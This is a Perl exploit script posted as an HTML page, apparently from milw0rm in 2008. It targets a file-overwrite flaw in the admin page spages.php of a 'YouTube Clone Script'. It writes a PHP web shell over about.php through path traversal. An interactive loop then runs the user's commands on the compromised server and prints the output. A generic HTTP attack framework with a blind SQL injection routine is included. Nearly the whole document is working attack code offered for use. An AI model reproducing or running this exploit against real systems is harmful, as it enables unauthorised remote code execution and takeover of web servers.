<html><head><title>YouTube Clone Script (spages.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl 
#inphex
#/siteadmin/spages.php
#        include(&quot;../include/config.php&quot;);
#        include(&quot;../include/function.php&quot;);
#
#        if($_REQUEST['update'])
#        {
#                $file_path = $config['BASE_DIR'].&quot;/templates/&quot;.$_REQUEST['page'];
#                if(file_exists($file_path))
#                {
#                        $handle = fopen($config['BASE_DIR'].&quot;/templates/&quot;.$_REQUEST['page'], &quot;w&quot;);
#                        fwrite($handle,stripslashes($_POST['body']));
#                        fclose($handle);
#                        $msg = &quot;Page updated successfully&quot;;
#                }
#                else
#                        $err = &quot;Page does not exist&quot;;
#        }
#
#        STemplate::assign('msg',$msg);
#        STemplate::assign('err',$err);
#        STemplate::display(&quot;siteadmin/spages.tpl&quot;);
#
#Very easy one...
#YouTube-Clone-Script is quite buggy,there are more bugs.

use Digest::MD5 qw(md5 md5_hex md5_base64);
use LWP::UserAgent;
use HTTP::Cookies;
use Switch;
$host_ = shift;
$path_ = shift;

print &quot;usage: $0 http://host /path/\n&quot;;
$info{'info'} = { 
	&quot;author&quot; =&gt; [&quot;inphex&quot;],
	&quot;name&quot; =&gt; [&quot;YouTube Clone Script Remote Code Execution&quot;],
	&quot;version&quot; =&gt; [],
	&quot;description&quot; =&gt; [&quot;This Script will exploit a Remote Code Execution vulnerability existing in the YouTube Clone Script\n&quot;],
	&quot;options&quot; =&gt;
	{
		&quot;agent&quot; =&gt; &quot;&quot;,  
		&quot;proxy&quot; =&gt; &quot;&quot;,  
		&quot;default_headers&quot; =&gt; [  
			[&quot;key&quot;,&quot;value&quot;]], 
		&quot;timeout&quot; =&gt; 2, 
		&quot;cookie&quot; =&gt;     
		{
			&quot;cookie&quot; =&gt; [&quot;key=value&quot;],
		},
	},
	&quot;sending_options&quot; =&gt;
	{
			&quot;host&quot; =&gt; $host_, 
			&quot;path&quot; =&gt; $path_.&quot;siteadmin/spages.php&quot;,           
		    &quot;port&quot; =&gt; 80,                  
			&quot;method_a&quot; =&gt; &quot;REMOTE_CHECK&quot;,  
			&quot;attack&quot; =&gt;
		{
				&quot;update&quot; =&gt; [&quot;get&quot;,&quot;update&quot;,&quot;1&quot;],  
				&quot;path&quot; =&gt; [&quot;get&quot;,&quot;page&quot;,&quot;../about.php&quot;],
				&quot;content&quot; =&gt; [&quot;post&quot;,&quot;body&quot;,&quot;&lt;?php echo system(\$_GET[cmd]); ?&gt;&quot;],
		},
	},

};
&amp;start($info{'info'},222);
do {
	print &quot;\$&quot;;$cmd = &lt;STDIN&gt;;chomp($cmd);
	$info{'info'} = { &quot;options&quot; =&gt;{&quot;agent&quot; =&gt; &quot;&quot;,  &quot;proxy&quot; =&gt; &quot;&quot;,  &quot;default_headers&quot; =&gt; [  [&quot;key&quot;,&quot;value&quot;]], &quot;timeout&quot; =&gt; 2, &quot;cookie&quot; =&gt;     {&quot;cookie&quot; =&gt; [&quot;key=value&quot;],},},&quot;sending_options&quot; =&gt;{&quot;host&quot; =&gt; $host_, &quot;path&quot; =&gt; $path_.&quot;about.php&quot;,           &quot;port&quot; =&gt; 80,                  &quot;method_a&quot; =&gt; &quot;CODE_EXECUTION&quot;,  &quot;attack&quot; =&gt;{&quot;cmd&quot; =&gt; [&quot;get&quot;,&quot;cmd&quot;,$cmd],  },},};
    &amp;start($info{'info'},221);
    $content = ${$info{'info'}}{221}{'content'};
    print $content;
	print &quot;\n&quot;;
} while (1);
sub start
{
	$a_ = shift;
	@EXPORT		= qw( start $return $a_ ); 
	$id = shift;
	$get_dA = get_d_p_s(&quot;get&quot;);
	$post_dA = get_d_p_s(&quot;post&quot;);
	my ($x,$c,$m,$h,$ff,$kf,$hp,$c,$cccc) = (0,0,0,0,0,0,0,0,0);
	my $jj = 1;
	my $ii = 48;
    my $hh = 1;
	my $ppp = 0;
	my $s = shift;
	my $a = &quot;&quot;;
	my $res_p = &quot;&quot;;
	my $h = &quot;&quot;;
	($h_host_h_xdsjaop,$h_path_h_xdsjaop,$h_port_h_xdsjaop,$method_m) = ($a_-&gt;{'sending_options'}{'host'},$a_-&gt;{'sending_options'}{'path'},$a_-&gt;{'sending_options'}{'port'},$a_-&gt;{'sending_options'}{'method_a'});
	$ua = LWP::UserAgent-&gt;new;
	$ua-&gt;timeout($a_-&gt;{'options'}{'timeout'});  
	if ($a_-&gt;{'options'}{'proxy'}) {
	    $ua-&gt;proxy(['http', 'ftp'] =&gt; $a_-&gt;{'options'}{'proxy'});
	}
	$agent = $a_-&gt;{'options'}{'agent'} || &quot;Mozilla/5.0&quot;; 
	$ua-&gt;agent($agent); 
	{                                                 
		while (($k,$v) = each(%{$a_}))
			{
			if ($k ne &quot;options&quot; &amp;&amp; $k ne &quot;sending_options&quot;)
				{
				foreach $r (@{$a_-&gt;{$k}})
					{
					if ($a_-&gt;{$k}[0])
						{
						print $k.&quot;:&quot;.$a_-&gt;{$k}[0].&quot;\n&quot;;
						}
					}
				}
			}


		foreach $j (@{$a_-&gt;{'options'}{'default_headers'}})
			{    
			$ua-&gt;default_headers-&gt;push_header($a_-&gt;{'options'}{'default_headers'}[$m][0] =&gt; $a_-&gt;{'options'}{'default_headers'}[$m][1]);
			$m++;
			}

		if ($a_-&gt;{'options'}{'cookie'}{'cookie'}[0])
			{          
			$ua-&gt;default_headers-&gt;push_header('Cookie' =&gt; $a_-&gt;{'options'}{'cookie'}{'cookie'}[0]);
			}

			

	}
	switch ($method_m)        
	{
		case &quot;attack&quot; { &amp;attack();}
		case &quot;SQL_INJECTION_BLIND&quot; { &amp;sql_injection_blind();}
		case &quot;REMOTE_COMMAND_EXECUTION&quot; { &amp;attack();}
		case &quot;REMOTE_CODE_EXECUTION&quot; {&amp;attack();}
		case &quot;REMOTE_FILE_INCLUSION&quot; { &amp;attack();}
		case &quot;LOCAL_FILE_INCLUSION&quot; { &amp;attack(); }
		else { &amp;attack(); }  

	}


	sub attack
	{
		
		if ($post_dA eq &quot;&quot;) {
			$method = &quot;get&quot;;
		} elsif ($post_dA ne &quot;&quot;)
		{
			$method = &quot;post&quot;;
		}
		if ($method eq &quot;get&quot;) {  
			$res_p = get_data($h_host_h_xdsjaop,$h_path_h_xdsjaop.&quot;?&quot;.$get_dA);
			${$a_}{$id}{'content'} = $res_p;
			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				$res_p =~ /$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/;
				
				while ($jj &lt;= $a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][1])
					{
					if (${$jj} ne &quot;&quot;)
						{
						${$a_}{$id}{'regex'}[$h] = ${$jj};
						}
						$jj++;
					}
					$h++;
				}
		} elsif ($method eq &quot;post&quot;)
		{
			$res_p = post_data($h_host_h_xdsjaop,$h_path_h_xdsjaop.&quot;?&quot;.$get_dA,&quot;application/x-www-form-urlencoded&quot;,$post_dA);
		
			${$a_}{$id}{'content'} = $res_p;

			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				$res_p =~ /$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/;
				while ($jj &lt;= $a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][1])
					{
					if (${$jj} ne &quot;&quot;)
						{
						${$a_}{$id}{'regex'}[$h] = ${$jj};
						}
						$jj++;
					}
					$h++;
				}
		}

	}
	sub sql_injection_blind
	{
		while ()
			{
			while ($ii &lt;= 90)
				{
				if(check($ii,$hh) == 1)
				{
					syswrite STDOUT,lc(chr($ii));
					$hh++;
					$chr = $chr.chr($ii);
					}
					$ii++;
			}
			push(@ffs,length($chr)); 
			if (($#ffs -1) == $ffs)
				{
				print &quot;\nFinished/Error\n&quot;;
				exit;
				}
				$ii = 48;
		}
	}
	sub check($$)
	{
		$ii = shift;
		$hh = shift;
		if (get_d_p_s(&quot;post&quot;) ne &quot;&quot;)
			{
			$method = &quot;post&quot;;
		} else { $method = &quot;get&quot;;}
		if ($method eq &quot;get&quot;)
			{
			$ppp++;
			$query = modify($get_dA,$ii,$hh);
			print $ii.&quot;-&quot;.$hh.&quot;\n&quot;;
			$res_p = get_data($h_host_h_xdsjaop,$a_-&gt;{'sending_options'}{'path'}.&quot;?&quot;.$query);
			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				if ($res_p =~m/$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/)
					{
					return 1;
					}
					else 
				{
						return 0;
				}
				$h++;
			}
		} elsif ($method eq &quot;post&quot;)
			{
			$ppp++;
			$query_g = modify($get_dA,$ii,$hh);
			$query_p = modify($post_dA,$ii,$hh);
			
			$res_p = post_data($h_host_h_xdsjaop,$a_-&gt;{'sending_options'}{'path'}.&quot;?&quot;.$query_g,&quot;application/x-www-form-urlencoded&quot;,$query_p);
			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				if ($res_p =~m/$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/)
					{
					return 1;
					}
					else 
					{
						return 0;
					}
				$h++;
			}
		}
	}
    sub modify($$$)
	{
	    $string = shift;
	    $replace_by = shift;
	    $replace_by1 = shift;

	    if ($string !~/\$i/ &amp;&amp; $string !~/\$h/) {
		    print $string;
	        } elsif ($string !~/\$i/)
		{
		        $ff = substr($string,0,index($string,&quot;\$h&quot;));
	            $ee =  substr($string,rindex($string,&quot;\$h&quot;)+2);
	            $string = $ff.$replace_by1.$ee;

	            return $string;
		} elsif ($string !~/\$h/)
		{
	        $f = substr($string,0,index($string,&quot;\$i&quot;));
	        $e = substr($string,rindex($string,&quot;\$i&quot;)+2);
	        $string = $f.$replace_by.$e;
		    return $string;
		} else
		{
		    $f = substr($string,0,index($string,&quot;\$i&quot;));
	        $e = substr($string,rindex($string,&quot;\$i&quot;)+2);
	        $string = $f.$replace_by.$e;

		    $ff = substr($string,0,index($string,&quot;\$h&quot;));
	        $ee =  substr($string,rindex($string,&quot;\$h&quot;)+2);
	        $string = $ff.$replace_by1.$ee;

		    return $string;
		}
	}
	sub get_d_p_s
	{
		$g_d_p_s = shift;
		$post_data = &quot;&quot;;
		$get_data = &quot;&quot;;
		$header_data = &quot;&quot;;
		%header_dA = ();
		while (($k,$v) = each(%{$a_-&gt;{'sending_options'}{'attack'}}))
			{
			if ($a_-&gt;{'sending_options'}{'attack'}{$k}[0] =~ &quot;get&quot;)
				{

				$method = &quot;get&quot;; push(@get,$a_-&gt;{'sending_options'}{'attack'}{$k}[1].&quot;=&quot;.$a_-&gt;{'sending_options'}{'attack'}{$k}[2]);
				}
				elsif ($a_-&gt;{'sending_options'}{'attack'}{$k}[0] =~ &quot;post&quot;) 
				{
					$method = &quot;post&quot;; push(@post,$a_-&gt;{'sending_options'}{'attack'}{$k}[1].&quot;=&quot;.$a_-&gt;{'sending_options'}{'attack'}{$k}[2]);
					}
					elsif ($a_-&gt;{'sending_options'}{'attack'}{$k}[0] =~ &quot;header&quot;)
				{
				        $header_dA{$a_-&gt;{'sending_options'}{'attack'}{$k}[1]} = $a_-&gt;{'sending_options'}{'attack'}{$k}[2];
				}
				$hp++;
			}
		$yy = $#get;
		while ($bb &lt;= $#get)
			{
			$get_data .= $get[$yy].&quot;&amp;&quot;;
			$bb++;
			$yy--;
			}
		$l = $#post;
		while ($k &lt;= $#post)
			{
			
			$post_data .= $post[$l].&quot;&amp;&quot;;
			$k++;
			$l--;
			}
		if ($g_d_p_s eq &quot;get&quot;)
			{
			
			return $get_data;
			}
			elsif ($g_d_p_s eq &quot;post&quot;)
		{
			return $post_data;
		} elsif ($g_d_p_s eq &quot;header&quot;)
		{
			return %header_dA;
		}
	}
	sub get_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		%hash = get_d_p_s(&quot;header&quot;);
	    while (($u,$c) = each(%hash))
			{
			$ua-&gt;default_headers-&gt;push_header($u =&gt; $c);
			}
		$req = $ua-&gt;get($h_host_h_xdsjaop.$h_path_h_xdsjaop);
		return $req-&gt;content;
	}
	sub post_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		$content_type = shift;
		$send = shift;
		%hash = get_d_p_s(&quot;header&quot;);
	    while (($u,$c) = each(%hash))
			{
		    $ua-&gt;default_headers-&gt;push_header($u =&gt; $c);
			}
		$req = HTTP::Request-&gt;new(POST =&gt; $h_host_h_xdsjaop.$h_path_h_xdsjaop);
		$req-&gt;content_type($content_type);
		$req-&gt;content($send);
		$res = $ua-&gt;request($req);
		return $res-&gt;content;
	}

}

# milw0rm.com [2008-04-23]</pre></html>